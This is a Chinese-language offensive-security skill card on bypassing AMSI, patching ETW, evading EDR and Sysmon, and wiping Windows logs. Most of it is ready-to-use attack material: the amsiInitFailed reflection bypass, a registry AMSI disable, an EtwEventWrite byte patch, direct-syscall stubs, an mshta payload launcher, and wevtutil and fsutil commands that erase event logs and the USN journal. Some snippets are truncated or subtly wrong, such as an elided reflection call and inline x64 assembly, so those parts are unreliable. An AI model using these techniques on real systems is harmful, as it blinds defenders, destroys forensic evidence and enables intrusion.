---
id: 08-004
title: "AMSI绕过与EDR规避 (AMSI Bypass & EDR Evasion)"
category: 痕迹清除
category_en: "Covering Tracks"
difficulty: ★★★★★
tools: "AMSI, ETW, Sysmon, EDR, Bypass Tools"
last_updated: 2026-05
tags: ["covering-tracks", "anti-forensics", "process-injection", "obfuscation"]
subdomain: covering-tracks
nist_csf: ["DE.CM-01", "PR.PT-01"]
mitre_attack: ["T1070", "T1562", "T1055", "T1027"]
---
# AMSI绕过与EDR规避 (AMSI Bypass & EDR Evasion)

## 概述

AMSI（Windows Antimalware Scan Interface）和 EDR（Endpoint Detection and Response）是现代 Windows 环境中主要的检测防御层。AMSI 实时扫描脚本执行内容，EDR 监控系统调用和进程行为。本技能覆盖 AMSI/ETW 绕过技术、EDR 规避方法以及 Sysmon 检测绕过。

## 核心技能

### 1. AMSI 绕过技术

```powershell
# 方法 1: 注册表禁用 (需管理员)
# 设置注册表禁用 AMSI
reg add "HKLM\SOFTWARE\Microsoft\Windows Script Host\Settings" /v AmsiEnable /t REG_DWORD /d 0 /f

# 方法 2: 内存补丁 — 修改 amsi.dll!AmsiScanBuffer
# 将 AmsiScanBuffer 返回结果修改为 AMSI_RESULT_CLEAN

# PowerShell 内存补丁 AMSI
$amsi = [System.Reflection.Assembly]::Load([System.Convert]::FromBase64String("..."))
$amsiScanBuffer = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    [System.Runtime.InteropServices.Marshal]::GetFunctionPointerForDelegate(
        [System.Runtime.InteropServices.Marshal]::...
    )
)

# 方法 3: 通过反射修改 AMSI 上下文
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# 方法 4: 硬件断点绕过
# 在 AmsiScanBuffer 上设置硬件断点
# 断点触发时立即修改返回值

# 方法 5: DLL 加载劫持
# 劫持 amsi.dll 的加载过程，替换为自定义实现
```

### 2. ETW 绕过

```cpp
// ETW (Event Tracing for Windows) 绕过
// ETW 用于记录系统事件，EDR 常通过 ETW 获取进程行为

// 方法 1: 使用 EtwEventWrite 补丁
// 将 EtwEventWrite 函数开头替换为 ret (0xC3)

// 方法 2: 使用 NtSetInformationProcess 禁用 ETW
// Windows 10 1809+ 支持
ULONG isEtwDisabled = 1;
NtSetInformationProcess(
    GetCurrentProcess(),
    (PROCESS_INFORMATION_CLASS)0x1E,  // ProcessTraceFlags
    &isEtwDisabled,
    sizeof(ULONG)
);

// 方法 3: 运行时修补 EtwEventWrite
// 修改 EtwEventWrite 的前 2 字节为 XOR EAX,EAX; RET (0x33 0xC0 0xC3)
BYTE patch[] = { 0x33, 0xC0, 0xC3 };
WriteProcessMemory(GetCurrentProcess(), etwEventWriteAddr, patch, 3, NULL);

// 方法 4: 通过 .NET 绕过
// 在 .NET 级别禁用 ETW
System.Diagnostics.Trace.Listeners.Clear();
```

### 3. EDR 规避技术

```cpp
// EDR 通常通过以下方式监控:
// 1. ETW 事件
// 2. 内核回调 (ProcessNotify, ThreadNotify, ImageLoad)
// 3. 用户态 API Hook (通常通过 DLL 注入)
// 4. 内核态 Minifilter

// 技术 1: 直接系统调用 (Syscall)
// 绕过用户态 API Hook，直接调用 syscall
// 使用 NTDLL 的 syscall stub 或 Shellcode 直接 syscall

// 64 位直接系统调用:
__asm {
    mov r10, rcx
    mov eax, syscall_number  // 如 NtCreateProcess 的编号
    syscall
    ret
}

// 使用 SysWhispers 自动生成 syscall stub
// https://github.com/jthuraisamy/SysWhispers

// 技术 2: 间接系统调用
// 利用 ntdll.dll 中的有效 syscall 指令
// 通过解析 ntdll 找到 syscall; ret 序列执行

// 技术 3: 回调表遍历
// 枚举内核回调并移除 EDR 注册的进程/线程回调

// 技术 4: ETW 日志清理
// 使用 EtwEventWrite 补丁禁用当前进程的 ETW 日志

// 技术 5: 内存扫描规避
// 在不使用时加密敏感内存区域
// 使用指向指针的指针间接引
VirtualProtect(sensitive_mem, size, PAGE_NOACCESS, &old);
```

### 4. Sysmon 检测绕过

```powershell
# Sysmon 事件 ID:
# 1 - 进程创建, 3 - 网络连接, 7 - 镜像加载
# 8 - CreateRemoteThread, 11 - 文件创建, 13 - 注册表修改

# 绕过方法 1: 使用 LoLBin (Living-off-the-Land)
# 使用系统自带工具执行恶意操作
# Certutil.exe, mshta.exe, bitsadmin.exe, wmic.exe

# 使用 mshta 执行 JavaScript
mshta.exe javascript:"new ActiveXObject('WScript.Shell').Run('powershell payload',0,false);close()"

# 绕过方法 2: 父进程伪造 (Parent PID Spoofing)
# 创建合法进程 (如 explorer.exe) 作为子进程的父进程
# 使用 UpdateProcThreadAttribute + PROC_THREAD_ATTRIBUTE_PARENT_PROCESS

# 绕过方法 3: 中断 Sysmon 的 EventLog 通道
# 通过命名管道攻击 Sysmon 的 EventLog 通信通道

# 绕过方法 4: WMI 持久化 (绕过进程创建事件)
# 使用 WMI 执行命令，不创建常规进程
$filter = Set-WmiInstance -Class __EventFilter -Namespace root\subscription -Arguments @{
    Name="EvasionFilter"
    EventNameSpace="root\cimv2"
    QueryLanguage="WQL"
    Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
}
```

### 5. 日志清理与抹除

```powershell
# 清除 Windows 事件日志
Clear-EventLog -LogName Security, System, Application
wevtutil cl Security
wevtutil cl System
wevtutil cl Application
wevtutil cl "Windows PowerShell"
wevtutil cl "Microsoft-Windows-Sysmon/Operational"

# 清除 ETW 日志 (需管理员)
# 删除 ETW 日志文件
Remove-Item -Path "C:\Windows\System32\winevt\Logs\Microsoft-Windows-Sysmon*" -Force

# 禁用后续日志收集 (进程级别)
# 使用 EtwEventWrite 补丁禁用当前进程 ETW

# 清除 Prefetch 文件
Remove-Item -Path "C:\Windows\Prefetch\*" -Exclude "ReadyBoot*" -Force

# 清除 Recent Files
Remove-Item -Path "$env:APPDATA\Microsoft\Windows\Recent\*" -Force

# 清除 USN Journal (需管理员)
fsutil usn deletejournal /D C:
```

## 绕过程度对比

| 技术 | 绕过层面 | 隐蔽性 | 实施难度 | EDR 检测率 |
|:---|:---|:---:|:---:|:---:|
| AMSI 注册表禁用 | AMSI | 低 | 低 | 高 |
| AMSI 内存补丁 | AMSI | 中 | 中 | 中 |
| ETW 注册表中止 | ETW | 中 | 中 | 中 |
| 直接系统调用 | EDR Hook | 高 | 高 | 低 |
| 间接系统调用 | EDR Hook | 高 | 高 | 低 |
| DLL 侧加载 | Application | 高 | 中 | 中 |
| LoLBin | 检测策略 | 高 | 低 | 中 |
| 父进程伪造 | 进程关系 | 中 | 中 | 中 |

## 常用工具

| 工具 | 用途 | 链接 |
|:---|:---|:---|
| SysWhispers | 直接系统调用生成器 | https://github.com/jthuraisamy/SysWhispers |
| AMSI.fail | AMSI 绕过生成器 | https://amsi.fail/ |
| EDRSandBlast | EDR 检测分析工具 | https://github.com/wavvs/EDRSandBlast |
| Cobbr | .NET C2 框架 (AMSI 绕过) | https://github.com/cobbr/Covenant |
| SharpSploit | .NET 渗透库 | https://github.com/cobbr/SharpSploit |

## 参考资源

- [MITRE ATT&CK — Impair Defenses (T1562)](https://attack.mitre.org/techniques/T1562/)
- [AMSI Bypass Methods — S3cur3Th1sSh1t](https://github.com/S3cur3Th1sSh1t/AMSI-Bypass)
- [ETW Bypass — xpn's Blog](https://blog.xpnsec.com/etw-bypass/)
- [EDR Evasion — Outflank Blog](https://outflank.nl/blog/2020/10/15/edr-bypass-methodology/)
- [Sysmon Evasion — Elastic Security Labs](https://www.elastic.co/security-labs/)
